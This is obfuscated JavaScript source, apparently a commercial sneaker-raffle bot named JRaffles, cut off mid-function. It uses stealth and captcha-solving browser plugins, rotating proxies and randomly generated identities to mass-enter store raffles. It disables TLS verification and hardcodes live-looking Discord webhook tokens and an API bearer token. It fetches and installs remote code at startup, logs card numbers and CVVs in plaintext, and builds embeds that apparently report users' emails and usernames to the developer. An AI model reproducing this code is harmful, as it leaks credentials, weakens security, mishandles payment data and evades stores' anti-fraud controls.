process['env']['NODE_TLS_REJECT_UNAUTHORIZED'] = '0';
const _0x1dee0c = require('fs'), _0xc40876 = new Date()['toDateString']() + '\x20' + new Date()['getHours']() + '\x20' + new Date()['getMinutes']() + '\x20' + new Date()['getSeconds']();
function _0xce0cfa(_0x38c26b) {
    const _0x4ae5f9 = _0x1dee0c['createWriteStream'](_0x38c26b, { 'flags': 'a' }), _0x138da2 = console['log'];
    console['log'] = function () {
        const _0x4b288c = Array['prototype']['slice']['call'](arguments), _0x44a0f5 = _0x4b288c['join']('\x20') + '\x0a';
        _0x4ae5f9['write'](_0x44a0f5), _0x138da2['apply'](console, _0x4b288c);
    };
}
_0xce0cfa('../logs/log\x20' + _0xc40876);
var _0x57d6ec = require('tough-cookie'), _0x15c146 = require('node-imap'), _0x29b31a = require('util')['inspect'];
const _0x2e3fa0 = require('mailparser')['simpleParser'], { EmbedBuilder: _0x429eca } = require('discord.js');
var _0x55a00e = require('exe');
const { execFile: _0x1c07c8 } = require('child_process'), _0x13c80e = require('puppeteer-extra'), _0x2643c9 = require('cross-spawn'), _0x4b936d = require('puppeteer-extra-plugin-recaptcha'), _0x146fac = require('puppeteer-extra-plugin-stealth'), _0x28396b = require('chalk'), _0x34c195 = require('node-bash-title'), _0x2e12a3 = require('axios'), _0x548d40 = require('papaparse');
var _0x2c6e78 = require('random-name');
const _0x5e7aa2 = require('request');
var _0x48d650 = require('prompt');
const _0xaed655 = _0x5e7aa2['jar']();
var _0x5d2560 = {};
const _0x3abfb2 = '1067398661929181186/wvxr1d4nwFDFE-hAKBisU_mVWLloqatitfWvCqqIv38EUYiJMm_Pr3VKsuLsUBKN3PPj', _0x36f526 = '1067398862056210432/TZs7kSEcDtUD13Vzl7VQhculxdtocZI8HKU7l_fW_W0qthftmSpHxNDY9NB3Hc4v6Yhy', _0x19dbb1 = '1068515411877957743/t_TXlLhYbeQmPL19hyGeNqi1G0KPT8KCBYOVOcryGMvXPfIUBEpNZRBCC1j7OFRej4A6', _0x531deb = '1068519704525807616/luGgvM1ZbR7g1zM5-10y5yceL2OGVCjrlkB6XxQL-hdoHUJ6hwSVAn6vVNyieHWLqPHE', _0xc0965f = '1070657276525940746/GSfXwIxjuRjwmP3sTDw73M4V2P5OJqMFgZyECtpBwFmtXGINvj1xFsVsZ2KwGBpJNHpn', _0x5e64a5 = '1072865476457287711/EePVQu0bb06IdHG3FfG7M-JDaE-38prupCPoCqaduP6mG_tsshUSaKidyfyVx0YgNC7e';
var _0x249fd1 = 'https://discord.com/api/webhooks/', _0x40a249 = '' + _0x249fd1 + _0x19dbb1, _0xbfa384 = '' + _0x249fd1 + _0x531deb, _0x4f558b = '' + _0x249fd1 + _0x3abfb2, _0x248b77 = '' + _0x249fd1 + _0x36f526, _0x4b117a = '' + _0x249fd1 + _0xc0965f, _0x232186 = '' + _0x249fd1 + _0x5e64a5;
const _0x3f2a7f = JSON['parse'](_0x1dee0c['readFileSync']('country.json', 'utf-8')), _0x1ad691 = JSON['parse'](_0x1dee0c['readFileSync']('../package.json', 'utf-8')), _0x3e85bb = _0x1ad691['version'];
var _0x54b9d3, _0x3dc05f, _0x297379, _0x5b8ee6, _0x54664e, _0x4ae8bc, _0x4a7d40, _0x54dda5;
const _0x592c6a = 'pk_7R7rRwMpveiR8OufEx9xIDMdU8Y95GgvGLF59wWRqklMwhXdpDnh5sN2KfaPHjEe';
let _0x301ddd = ![];
const _0x161347 = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ', _0x9161fc = '0123456789';
var _0x29ccb0 = _0x161347['split']('');
const _0x570cf8 = require('auto-git-update'), _0x396104 = {
    'repository': 'https://github.com/Jarno97/JRafflesBot',
    'branch': 'main',
    'fromReleases': ![],
    'tempLocation': 'C:/temp/jraffles',
    'ignoreFiles': [
        'settings.json',
        'proxies.txt',
        'tasks/maha.csv',
        'tasks/footshop.csv',
        'tasks/afew.csv',
        'tasks/oqium.csv',
        'tasks/patta.csv',
        'accounts/patta.csv',
        'tasks/kickz.csv',
        'accounts/kickz-verified.csv',
        'accounts/kickz-unverified.csv'
    ]
}, _0x377dfe = new _0x570cf8(_0x396104);
async function _0x2b6429() {
    _0x54664e = _0x1dee0c['readdirSync']('../proxies'), _0x5b8ee6 = _0x1dee0c['readdirSync']('../tasks'), !_0x1dee0c['existsSync']('../accounts/fenom.csv') && _0x1dee0c['writeFileSync']('../accounts/fenom.csv', 'Email,Password\x0a'), !_0x1dee0c['existsSync']('../accounts/paypal.csv') && _0x1dee0c['writeFileSync']('../accounts/paypal.csv', 'Email,Password,Proxy\x0a'), !_0x1dee0c['existsSync']('../accounts/bstn.csv') && _0x1dee0c['writeFileSync']('../accounts/bstn.csv', 'Email,Password\x0a'), !_0x1dee0c['existsSync']('../accounts/eql.csv') && _0x1dee0c['writeFileSync']('../accounts/eql.csv', 'Email,Password,Phone\x0a'), !_0x1dee0c['existsSync']('../failed-tasks.csv') && _0x1dee0c['writeFileSync']('../failed-tasks.csv', 'Time,Store,Mode,Url,Size,Follower,FirstName,LastName,Address1,Address2,HouseNumber,Zip,City,State,Country,Phone,Email,Password,PaymentMethod,CardType,NameOnCard,CardNumber,ExpiryDate,CVV,IsBillingSame,BillingFirstName,BillingLastName,BillingAddress1,BillingAddress2,BillingHouseNumber,BillingZip,BillingCity,BillingState,BillingCountry,BillingPhone\x0a'), !_0x1dee0c['existsSync']('../successful-tasks.csv') && _0x1dee0c['writeFileSync']('../successful-tasks.csv', 'Time,Store,Mode,Url,Size,Follower,FirstName,LastName,Address1,Address2,HouseNumber,Zip,City,State,Country,Phone,Email,Password,PaymentMethod,CardType,NameOnCard,CardNumber,ExpiryDate,CVV,IsBillingSame,BillingFirstName,BillingLastName,BillingAddress1,BillingAddress2,BillingHouseNumber,BillingZip,BillingCity,BillingState,BillingCountry,BillingPhone\x0a'), _0x5d2560 = JSON['parse'](_0x1dee0c['readFileSync']('../settings.json', 'utf-8')), !_0x5d2560['delay'] && (_0x5d2560['delay'] = 0x3c, _0x1dee0c['writeFileSync']('../settings.json', JSON['stringify'](_0x5d2560, null, 0x2))), !_0x5d2560['threads'] && (_0x5d2560['threads'] = 0x1, _0x1dee0c['writeFileSync']('../settings.json', JSON['stringify'](_0x5d2560, null, 0x2))), !_0x5d2560['python'] && (_0x2643c9('start', [
        'cmd',
        '/k',
        'py\x20-m\x20pip\x20install\x20-r\x20modules/Confirmed/requirements.txt'
    ], { 'shell': !![] }), _0x2643c9('start', [
        'cmd',
        '/k',
        'py\x20-m\x20pip\x20install\x20git+https://github.com/66niko99/py-adyen-encrypt.git'
    ], { 'shell': !![] }), _0x5d2560['python'] = 'uptodate', _0x1dee0c['writeFileSync']('../settings.json', JSON['stringify'](_0x5d2560, null, 0x2))), !_0x5d2560['masterMail'] && (_0x5d2560['masterMail'] = 'yourmail@gmail.com', _0x1dee0c['writeFileSync']('../settings.json', JSON['stringify'](_0x5d2560, null, 0x2))), !_0x5d2560['CapSolver'] && (_0x5d2560['CapSolver'] = 'yourkeyhere', _0x1dee0c['writeFileSync']('../settings.json', JSON['stringify'](_0x5d2560, null, 0x2))), !_0x5d2560['masterPassword'] && (_0x5d2560['masterPassword'] = 'read\x20the\x20guide\x20on\x20how\x20to\x20get\x20an\x20APP\x20PASSWORD', _0x1dee0c['writeFileSync']('../settings.json', JSON['stringify'](_0x5d2560, null, 0x2))), !_0x5d2560['captchaKey'] && (_0x5d2560['captchaKey'] = '', _0x1dee0c['writeFileSync']('../settings.json', JSON['stringify'](_0x5d2560, null, 0x2))), !_0x5d2560['useRandomProxy'] && (_0x5d2560['useRandomProxy'] = !![], _0x1dee0c['writeFileSync']('../settings.json', JSON['stringify'](_0x5d2560, null, 0x2))), !_0x5d2560['shuffleTasks'] && (_0x5d2560['shuffleTasks'] = ![], _0x1dee0c['writeFileSync']('../settings.json', JSON['stringify'](_0x5d2560, null, 0x2))), !_0x5d2560['webhook'] && (_0x5d2560['webhook'] = '', _0x1dee0c['writeFileSync']('../settings.json', JSON['stringify'](_0x5d2560, null, 0x2))), _0x5d2560['delay'] <= 0x1388 && (_0x5d2560['delay'] = _0x5d2560['delay'] * 0x3e8), _0x5d2560['AfewDelay'] && (delete _0x5d2560['AfewDelay'], _0x1dee0c['writeFileSync']('../settings.json', JSON['stringify'](_0x5d2560, null, 0x2))), _0x5d2560['MahaDelay'] && (delete _0x5d2560['MahaDelay'], _0x1dee0c['writeFileSync']('../settings.json', JSON['stringify'](_0x5d2560, null, 0x2))), _0x5d2560['footshopDelay'] && (delete _0x5d2560['footshopDelay'], _0x1dee0c['writeFileSync']('../settings.json', JSON['stringify'](_0x5d2560, null, 0x2))), _0x5d2560['MahaDelay'] = _0x5d2560['delay'], _0x249fd1 = _0x5d2560['webhook'], _0x4ae8bc = _0x5d2560['licenseKey'];
}
let _0x177c84, _0x32928f = [], _0x45a95e;
const _0x5954fc = _0x28aa02 => new Promise(_0x5c74a4 => setTimeout(_0x5c74a4, _0x28aa02));
function _0x19e736(_0x39120d, _0xf69afa) {
    return Math['floor'](Math['random']() * (_0xf69afa - _0x39120d + 0x1) + _0x39120d);
}
function _0x3e75da(_0x2151f0) {
    let _0x6bec9b = _0x2151f0['length'], _0x22eb54;
    while (_0x6bec9b != 0x0) {
        _0x22eb54 = Math['floor'](Math['random']() * _0x6bec9b), _0x6bec9b--, [_0x2151f0[_0x6bec9b], _0x2151f0[_0x22eb54]] = [
            _0x2151f0[_0x22eb54],
            _0x2151f0[_0x6bec9b]
        ];
    }
    return _0x2151f0;
}
async function _0x234b25(_0x33870c) {
    try {
        return _0x2e12a3['post']('https://api.whop.com/api/v2/memberships/' + _0x33870c + '/validate_license', { 'metadata': { 'key': '' } }, {
            'headers': {
                'Authorization': 'Bearer\x20DRT4qDTPjhk0dbWMnuTDrMuGiUh6MogGpjZL6gSDoLU',
                'Content-Type': 'application/json'
            }
        });
    } catch (_0x48bdf7) {
        console['log']('Error\x20checking\x20license:\x20' + _0x48bdf7['message']);
    }
}
async function _0x4918a2(_0x53b8c0) {
    console['clear']();
    if (_0x53b8c0 == 'AWGH-0N92-JE6S-HOHU') {
        console['log']('Please\x20paste\x20your\x20key\x20here:');
        var _0xf72e69 = await _0x48d650['get']('License');
        if (_0xf72e69['License'] == 'AWGH-0N92-JE6S-HOHU')
            return console['log']('Error\x20please\x20use\x20the\x20key\x20on\x20the\x20JRaffles\x20dashboard'), await _0x5954fc(0xbb8), _0x4918a2(_0x53b8c0);
        _0x53b8c0 = _0xf72e69['License'], _0x5d2560['licenseKey'] = _0x53b8c0, _0x4ae8bc = _0x53b8c0, _0x1dee0c['writeFileSync']('../settings.json', JSON['stringify'](_0x5d2560));
    }
    console['log']('Checking\x20license\x20' + _0x4ae8bc + '...'), await _0x5954fc(0x320);
    const _0x3b11a1 = await _0x234b25(_0x53b8c0);
    _0x4a7d40 = JSON['stringify'](_0x3b11a1['data']['discord']['username'])['substring'](0x1)['slice'](0x0, -0x1), _0x54dda5 = JSON['stringify'](_0x3b11a1['data']['discord']['image_url'])['substring'](0x1)['slice'](0x0, -0x1);
    if (!_0x3b11a1)
        return console['log']('License\x20not\x20found');
    if (!_0x3b11a1['data'])
        return console['log']('License\x20not\x20bound');
    return _0x3b11a1['data']['valid'] ? (console['log']('License\x20is\x20good\x20to\x20go!'), _0x301ddd = !![]) : (console['log']('Could\x20not\x20find\x20license..'), _0x301ddd = ![]);
}
async function _0x236e2e() {
    var _0x2b9a2b = await _0x48d650['get']('Module');
    return console['clear'](), _0x2b9a2b['Module'];
}
;
async function _0x4f3d63() {
    var _0x3d8be3 = await _0x48d650['get']('Setting');
    return console['clear'](), _0x3d8be3['Setting'];
}
async function _0x25449b(_0x229834) {
    var _0x3753ab = [];
    for (file of _0x5b8ee6) {
        var _0x27176a = _0x1dee0c['readFileSync']('../tasks/' + file, 'utf-8');
        tsParse = _0x548d40['parse'](_0x27176a, { 'header': !![] })['data'], tsParse[0x0]['Store'] == _0x229834['store'] && _0x3753ab['push'](file);
    }
    !_0x3753ab['length'] == 0x0 && (_0x5b8ee6 = _0x3753ab);
    console['log']('Choose\x20A\x20File\x20to\x20Run\x20\x0a');
    for (var _0x5b9dfe = 0x0; _0x5b9dfe < _0x5b8ee6['length']; _0x5b9dfe++) {
        console['log']('\x20(' + _0x5b9dfe + ')\x20' + _0x5b8ee6[_0x5b9dfe]);
    }
    console['log']('');
    var _0x5501e8 = await _0x48d650['get']('Task');
    if (_0x5501e8['Task'] > _0x5b8ee6['length'] - 0x1 || isNaN(_0x5501e8['Task']) == !![])
        return console['log']('Invalid\x20selection'), await _0x5954fc(0x3e8), _0x25449b();
    var _0x2552b1 = _0x1dee0c['readFileSync']('../tasks/' + _0x5b8ee6[_0x5501e8['Task']], 'utf-8');
    return _0x297379 = _0x548d40['parse'](_0x2552b1, { 'header': !![] })['data'], console['clear'](), console['log']('Running\x20' + _0x28396b['blue'](_0x5b8ee6[_0x5501e8['Task']])), _0x54b9d3 = _0x5b8ee6[_0x5501e8['Task']], _0x297379;
}
async function _0x56c054() {
    console['clear'](), console['log']('Choose\x20Proxies\x20to\x20Use\x20\x0a');
    for (var _0x3058af = 0x0; _0x3058af < _0x54664e['length']; _0x3058af++) {
        console['log']('\x20(' + _0x3058af + ')\x20' + _0x54664e[_0x3058af]);
    }
    console['log']('');
    var _0x2cc29d = await _0x48d650['get']('Proxies');
    if (_0x2cc29d['Proxies'] > _0x54664e['length'] - 0x1 || isNaN(_0x2cc29d['Proxies']) == !![])
        return console['log']('Invalid\x20selection'), await _0x5954fc(0x3e8), _0x56c054();
    var _0x356f9a = _0x1dee0c['readFileSync']('../proxies/' + _0x54664e[_0x2cc29d['Proxies']], 'utf-8')['split']('\x0a');
    let _0x58afdc = _0x356f9a['map']((_0x2bc050, _0xf06c6) => {
        sanatizeProxy = _0x2bc050['replace']('\x0d', '');
        if (_0x356f9a[_0xf06c6 + 0x1] != undefined)
            return '' + sanatizeProxy;
        return '' + sanatizeProxy;
    });
    return _0x3dc05f = _0x54664e[_0x2cc29d['Proxies']], console['clear'](), _0x58afdc;
}
async function _0x46686c() {
    var _0x58e1cc = await _0x48d650['get']('Value');
    return console['clear'](), _0x58e1cc['Value'];
}
async function _0x474607(_0x30f8e7) {
    console['clear'](), console['log']('What\x20would\x20you\x20like\x20to\x20do?\x20\x0a');
    for (var _0x37bd3f = 0x0; _0x37bd3f < _0x30f8e7['length']; _0x37bd3f++) {
        console['log']('\x20(' + _0x37bd3f + ')\x20[' + _0x30f8e7[_0x37bd3f]['name'] + ']');
    }
    ;
    console['log']('');
    var _0x2f8aa5 = await _0x48d650['get']('Module');
    return _0x2f8aa5['Module'];
}
async function _0x4b8224() {
    var _0x3432e6 = await _0x48d650['get']('Password');
    return console['clear'](), _0x3432e6['Password'];
}
;
async function _0x42b7ef() {
    var _0x1b66ca = await _0x48d650['get']('Links');
    return _0x1b66ca['Links'];
}
;
async function _0x3445aa() {
    console['log']('Choose\x20a\x20Raffle\x20to\x20enter:\x20\x0a');
    for (var _0x22141f = 0x0; _0x22141f < _0x32928f['length']; _0x22141f++) {
        console['log']('\x20(' + _0x22141f + ')\x20' + _0x32928f[_0x22141f]);
    }
    ;
    console['log']();
    let _0x51d13d = await _0x48d650['get']('Product');
    return console['clear'](), _0x51d13d['Product'];
}
;
function _0x52b59e() {
    var _0x11bd8 = new Date(Date['now']())['toLocaleTimeString']();
    return _0x11bd8;
}
;
function _0x1878e8() {
    var _0x2d7170 = new Date(Date['now']())['toLocaleString']();
    return _0x2d7170['replace'](',', '');
}
async function _0x4bfa5b(_0x5c973c, _0x3185c6) {
    let _0x1fa739 = { 'headers': { 'content-type': 'application/json' } };
    if (_0x3e85bb != 'devkey') {
        await _0x2e12a3['post'](_0x5c973c, _0x3185c6, _0x1fa739);
        return;
    }
    return console['log']('devkey\x20settings\x20enabled,\x20not\x20sending\x20webhooks');
}
;
async function _0xf2c38e(_0x1e2d7c, _0x31ed84, _0x475359, _0x3dae61, _0x1f6f5f) {
    if (!_0x3dae61 && _0x475359 == 'dev') {
        var _0x1332b3 = new _0x429eca()['setColor'](0xc0d6d6)['setTitle']('Successful\x20Raffle\x20Entry')['setAuthor']({
            'name': 'JRaffles',
            'iconURL': 'https://pbs.twimg.com/profile_images/1592888006293192704/--rXvwpf_400x400.jpg',
            'url': 'https://twitter.com/JRaffles_'
        })['setThumbnail'](_0x31ed84['logo'])['addFields']({
            'name': 'Store',
            'value': '' + _0x31ed84['store'],
            'inline': !![]
        })['addFields']({
            'name': 'Size',
            'value': '' + _0x1e2d7c['Size'],
            'inline': !![]
        })['addFields']({
            'name': 'Delay',
            'value': '' + _0x5d2560['delay'],
            'inline': !![]
        })['addFields']({
            'name': 'User',
            'value': '' + _0x4a7d40,
            'inline': !![]
        })['addFields']({
            'name': 'URL',
            'value': '' + _0x1e2d7c['Url'],
            'inline': !![]
        })['addFields']({
            'name': 'Mail',
            'value': '' + _0x1e2d7c['Email'],
            'inline': !![]
        })['setTimestamp']()['setFooter']({
            'text': 'JRaffles\x20v' + _0x3e85bb,
            'iconURL': 'https://pbs.twimg.com/profile_images/1592888006293192704/--rXvwpf_400x400.jpg'
        });
        return _0x1332b3['data'];
    } else {
        if (_0x3dae61 && _0x475359 == 'dev') {
            var _0x1332b3 = new _0x429eca()['setColor'](0xc0d6d6)['setTitle']('Failed\x20Raffle\x20Entry')['setAuthor']({
                'name': 'JRaffles',
                'iconURL': 'https://pbs.twimg.com/profile_images/1592888006293192704/--rXvwpf_400x400.jpg',
                'url': 'https://twitter.com/JRaffles_'
            })['setThumbnail'](_0x31ed84['logo'])['addFields']({
                'name': 'User',
                'value': '' + _0x4a7d40,
                'inline': !![]
            }, {
                'name': 'Store',
                'value': '' + _0x31ed84['store'],
                'inline': !![]
            }, {
                'name': 'Size',
                'value': '' + _0x1e2d7c['Size'],
                'inline': !![]
            }, {
                'name': 'Delay',
                'value': '' + _0x5d2560['delay'],
                'inline': !![]
            })['addFields']({
                'name': 'ERROR',
                'value': '' + _0x1f6f5f,
                'inline': !![]
            })['addFields']({
                'name': 'URL',
                'value': '' + _0x1e2d7c['Url']
            })['addFields']({
                'name': 'Mail',
                'value': '' + _0x1e2d7c['Email'],
                'inline': !![]
            })['setTimestamp']()['setFooter']({
                'text': 'JRaffles\x20v' + _0x3e85bb,
                'iconURL': 'https://pbs.twimg.com/profile_images/1592888006293192704/--rXvwpf_400x400.jpg'
            });
            return _0x1332b3['data'];
        } else {
            if (_0x475359 == 'pub') {
                var _0x1332b3 = new _0x429eca()['setColor'](0xc0d6d6)['setTitle']('Succesful\x20Raffle\x20Entry')['setAuthor']({
                    'name': 'JRaffles',
                    'iconURL': 'https://pbs.twimg.com/profile_images/1592888006293192704/--rXvwpf_400x400.jpg',
                    'url': 'https://twitter.com/JRaffles_'
                })['setThumbnail'](_0x31ed84['logo'])['addFields']({
                    'name': 'Store',
                    'value': '' + _0x31ed84['store'],
                    'inline': !![]
                }, {
                    'name': 'Size',
                    'value': '' + _0x1e2d7c['Size'],
                    'inline': !![]
                }, {
                    'name': 'Delay',
                    'value': '' + _0x5d2560['delay'],
                    'inline': !![]
                })['addFields']({
                    'name': 'URL',
                    'value': '||' + _0x1e2d7c['Url'] + '||'
                })['setTimestamp']()['setFooter']({
                    'text': 'JRaffles\x20v' + _0x3e85bb,
                    'iconURL': 'https://pbs.twimg.com/profile_images/1592888006293192704/--rXvwpf_400x400.jpg'
                });
                return _0x1332b3['data'];
            } else {
                if (_0x475359 == 'acc' && !_0x3dae61) {
                    var _0x1332b3 = new _0x429eca()['setColor'](0xc0d6d6)['setTitle']('Account\x20Generated')['setAuthor']({
                        'name': 'JRaffles',
                        'iconURL': 'https://pbs.twimg.com/profile_images/1592888006293192704/--rXvwpf_400x400.jpg',
                        'url': 'https://twitter.com/JRaffles_'
                    })['setThumbnail'](_0x31ed84['logo'])['addFields']({
                        'name': 'User',
                        'value': '' + _0x4a7d40,
                        'inline': !![]
                    }, {
                        'name': 'Store',
                        'value': '' + _0x31ed84['store'],
                        'inline': !![]
                    }, {
                        'name': 'Delay',
                        'value': '' + _0x5d2560['delay'],
                        'inline': !![]
                    })['setTimestamp']()['setFooter']({
                        'text': 'JRaffles\x20v' + _0x3e85bb,
                        'iconURL': 'https://pbs.twimg.com/profile_images/1592888006293192704/--rXvwpf_400x400.jpg'
                    });
                    return _0x1332b3['data'];
                } else {
                    if (_0x475359 == 'acc' && _0x3dae61) {
                        var _0x1332b3 = new _0x429eca()['setColor'](0xc0d6d6)['setTitle']('Account\x20Generation\x20Failed')['setAuthor']({
                            'name': 'JRaffles',
                            'iconURL': 'https://pbs.twimg.com/profile_images/1592888006293192704/--rXvwpf_400x400.jpg',
                            'url': 'https://twitter.com/JRaffles_'
                        })['setThumbnail'](_0x31ed84['logo'])['addFields']({
                            'name': 'User',
                            'value': '' + _0x4a7d40,
                            'inline': !![]
                        }, {
                            'name': 'Error',
                            'value': '' + _0x1f6f5f,
                            'inline': !![]
                        }, {
                            'name': 'Store',
                            'value': '' + _0x31ed84['store'],
                            'inline': !![]
                        }, {
                            'name': 'Delay',
                            'value': '' + _0x5d2560['delay'],
                            'inline': !![]
                        })['setTimestamp']()['setFooter']({
                            'text': 'JRaffles\x20v' + _0x3e85bb,
                            'iconURL': 'https://pbs.twimg.com/profile_images/1592888006293192704/--rXvwpf_400x400.jpg'
                        });
                        return _0x1332b3['data'];
                    } else {
                        if (_0x475359 == 'open') {
                            var _0x1332b3 = new _0x429eca()['setColor'](0xc0d6d6)['setTitle']('User\x20Opened\x20JRaffles')['setAuthor']({
                                'name': 'JRaffles',
                                'iconURL': 'https://pbs.twimg.com/profile_images/1592888006293192704/--rXvwpf_400x400.jpg',
                                'url': 'https://twitter.com/JRaffles_'
                            })['setThumbnail'](_0x54dda5)['addFields']({
                                'name': 'User',
                                'value': '' + _0x4a7d40,
                                'inline': !![]
                            })['setTimestamp']()['setFooter']({
                                'text': 'JRaffles\x20v' + _0x3e85bb,
                                'iconURL': 'https://pbs.twimg.com/profile_images/1592888006293192704/--rXvwpf_400x400.jpg'
                            });
                            return _0x1332b3['data'];
                        } else {
                            if (!_0x3dae61 && _0x475359 == 'ver') {
                                var _0x1332b3 = new _0x429eca()['setColor'](0xc0d6d6)['setTitle']('Successful\x20Verification')['setAuthor']({
                                    'name': 'JRaffles',
                                    'iconURL': 'https://pbs.twimg.com/profile_images/1592888006293192704/--rXvwpf_400x400.jpg',
                                    'url': 'https://twitter.com/JRaffles_'
                                })['setThumbnail'](_0x31ed84['logo'])['addFields']({
                                    'name': 'User',
                                    'value': '' + _0x4a7d40,
                                    'inline': !![]
                                }, {
                                    'name': 'Store',
                                    'value': '' + _0x31ed84['store'],
                                    'inline': !![]
                                }, {
                                    'name': 'Delay',
                                    'value': '' + _0x5d2560['delay'],
                                    'inline': !![]
                                })['setTimestamp']()['setFooter']({
                                    'text': 'JRaffles\x20v' + _0x3e85bb,
                                    'iconURL': 'https://pbs.twimg.com/profile_images/1592888006293192704/--rXvwpf_400x400.jpg'
                                });
                                return _0x1332b3['data'];
                            } else {
                                if (_0x3dae61 && _0x475359 == 'ver') {
                                    var _0x1332b3 = new _0x429eca()['setColor'](0xc0d6d6)['setTitle']('Verification\x20Failed')['setAuthor']({
                                        'name': 'JRaffles',
                                        'iconURL': 'https://pbs.twimg.com/profile_images/1592888006293192704/--rXvwpf_400x400.jpg',
                                        'url': 'https://twitter.com/JRaffles_'
                                    })['setThumbnail'](_0x31ed84['logo'])['addFields']({
                                        'name': 'User',
                                        'value': '' + _0x4a7d40,
                                        'inline': !![]
                                    }, {
                                        'name': 'Error',
                                        'value': '' + _0x1f6f5f,
                                        'inline': !![]
                                    }, {
                                        'name': 'Store',
                                        'value': '' + _0x31ed84['store'],
                                        'inline': !![]
                                    }, {
                                        'name': 'Delay',
                                        'value': '' + _0x5d2560['delay'],
                                        'inline': !![]
                                    })['setTimestamp']()['setFooter']({
                                        'text': 'JRaffles\x20v' + _0x3e85bb,
                                        'iconURL': 'https://pbs.twimg.com/profile_images/1592888006293192704/--rXvwpf_400x400.jpg'
                                    });
                                    return _0x1332b3['data'];
                                }
                            }
                        }
                    }
                }
            }
        }
    }
}
async function _0x414596(_0x5d6c88, _0x14c2e6) {
    var _0x2d3425 = _0x5d6c88[_0x14c2e6]['Address1']['split'](''), _0x3813d8 = _0x5d6c88[_0x14c2e6]['Address2']['split'](''), _0xec1b01 = _0x5d6c88[_0x14c2e6]['Email']['split']('@');
    for (var _0x3a2e26 = 0x0; _0x3a2e26 < _0x2d3425['length']; _0x3a2e26++) {
        if (_0x2d3425[_0x3a2e26] == 'X') {
            var _0x28d6e8 = Math['round'](Math['random']() * (_0x161347['length'] - 0x1));
            _0x2d3425[_0x3a2e26] = _0x29ccb0[_0x28d6e8];
        }
    }
    ;
    for (var _0x3a2e26 = 0x0; _0x3a2e26 < _0x3813d8['length']; _0x3a2e26++) {
        if (_0x3813d8[_0x3a2e26] == 'X') {
            var _0x28d6e8 = Math['round'](Math['random']() * (_0x161347['length'] - 0x1));
            _0x3813d8[_0x3a2e26] = _0x29ccb0[_0x28d6e8];
        }
    }
    ;
    _0x5d6c88[_0x14c2e6]['FirstName']['toUpperCase']() == 'RANDOM' && (_0x5d6c88[_0x14c2e6]['FirstName'] = _0x2c6e78['first']());
    _0x5d6c88[_0x14c2e6]['LastName']['toUpperCase']() == 'RANDOM' && (_0x5d6c88[_0x14c2e6]['LastName'] = _0x2c6e78['last']());
    _0xec1b01[0x0]['toUpperCase']() == 'RANDOM' ? _0xec1b01[0x0] = '' + _0x2c6e78['first']() + _0x2c6e78['last']() + _0x19e736(0x1, 0x3e7) + '@' : _0xec1b01[0x0] = _0xec1b01[0x0] + '@';
    _0x5d6c88[_0x14c2e6]['Email'] = _0xec1b01['join'](''), _0x5d6c88[_0x14c2e6]['Address1'] = _0x2d3425['join'](''), _0x5d6c88[_0x14c2e6]['Address2'] = _0x3813d8['join']('');
    _0x5d6c88[_0x14c2e6]['Phone'] == 'RANDOM' && (_0x5d6c88[_0x14c2e6]['Phone'] = '0' + _0x19e736(0x5f5e100, 0x3b9ac9ff));
    if (_0x5d6c88[_0x14c2e6]['Follower']['toUpperCase']() == 'RANDOM') {
        var _0x5b4cae = _0x19e736(0x1, 0x270f);
        _0x5d6c88[_0x14c2e6]['Follower'] = '' + _0x2c6e78['first']() + _0x2c6e78['last']() + _0x5b4cae + '\x20';
    }
    _0x5d6c88[_0x14c2e6]['HouseNumber']['toUpperCase']() == 'RANDOM' && (_0x5d6c88[_0x14c2e6]['HouseNumber'] = _0x19e736(0x1, 0xc8));
    if (_0x5d6c88[_0x14c2e6]['Address1']['toUpperCase']() == 'RANDOM') {
        var _0x5d39e6 = Math['round'](Math['random']() * (_0x161347['length'] - 0x1)), _0x125589 = _0x29ccb0[_0x5d39e6];
        _0x5d6c88[_0x14c2e6]['Address1'] = _0x2c6e78['last']() + 'straat', _0x5d6c88[_0x14c2e6]['Zip'] == '' && (_0x5d6c88[_0x14c2e6]['Postcode'] = _0x19e736(0x3e8, 0x270f) + '\x20' + _0x125589 + _0x125589, _0x5d6c88[_0x14c2e6]['Zip'] = _0x5d6c88[_0x14c2e6]['Postcode']), _0x5d6c88[_0x14c2e6]['HouseNumber'] = '' + _0x19e736(0x1, 0xc8);
    }
    return;
}
;
async function _0x1c26ba(_0x4685d8, _0x32b4bb) {
    _0x1dee0c['appendFileSync']('../failed-tasks.csv', _0x1878e8() + ',' + _0x32b4bb['store'] + ',' + _0x32b4bb['name'] + ',' + _0x4685d8['Url'] + ',' + _0x4685d8['Size'] + ',' + _0x4685d8['Follower'] + ',' + _0x4685d8['FirstName'] + ',' + _0x4685d8['LastName'] + ',' + _0x4685d8['Address1'] + ',' + _0x4685d8['Address2'] + ',' + _0x4685d8['HouseNumber'] + ',' + _0x4685d8['Zip'] + ',' + _0x4685d8['City'] + ',' + _0x4685d8['State'] + ',' + _0x4685d8['Country'] + ',' + _0x4685d8['Phone'] + ',' + _0x4685d8['Email'] + ',' + _0x4685d8['Password'] + ',' + _0x4685d8['PaymentMethod'] + ',' + _0x4685d8['CardType'] + ',' + _0x4685d8['NameOnCard'] + ',' + _0x4685d8['CardNumber'] + ',' + _0x4685d8['ExpiryDate'] + ',' + _0x4685d8['CVV'] + ',' + _0x4685d8['IsBillingSame'] + ',,,,,,,,,,\x0a');
}
async function _0x4904f4(_0x2b4ede, _0x1220a3) {
    _0x1dee0c['appendFileSync']('../successful-tasks.csv', _0x1878e8() + ',' + _0x1220a3['store'] + ',' + _0x1220a3['name'] + ',' + _0x2b4ede['Url'] + ',' + _0x2b4ede['Size'] + ',' + _0x2b4ede['Follower'] + ',' + _0x2b4ede['FirstName'] + ',' + _0x2b4ede['LastName'] + ',' + _0x2b4ede['Address1'] + ',' + _0x2b4ede['Address2'] + ',' + _0x2b4ede['HouseNumber'] + ',' + _0x2b4ede['Zip'] + ',' + _0x2b4ede['City'] + ',' + _0x2b4ede['State'] + ',' + _0x2b4ede['Country'] + ',' + _0x2b4ede['Phone'] + ',' + _0x2b4ede['Email'] + ',' + _0x2b4ede['Password'] + ',' + _0x2b4ede['PaymentMethod'] + ',' + _0x2b4ede['CardType'] + ',' + _0x2b4ede['NameOnCard'] + ',' + _0x2b4ede['CardNumber'] + ',' + _0x2b4ede['ExpiryDate'] + ',' + _0x2b4ede['CVV'] + ',' + _0x2b4ede['IsBillingSame'] + ',,,,,,,,,,\x0a');
}
function _0x91dc04() {
    let _0x2847ed = proxyFile['split']('\x0a'), _0x237f95 = _0x2847ed['map']((_0x2f70e6, _0x36a48e) => {
        sanatizeProxy = _0x2f70e6['replace']('\x0d', '');
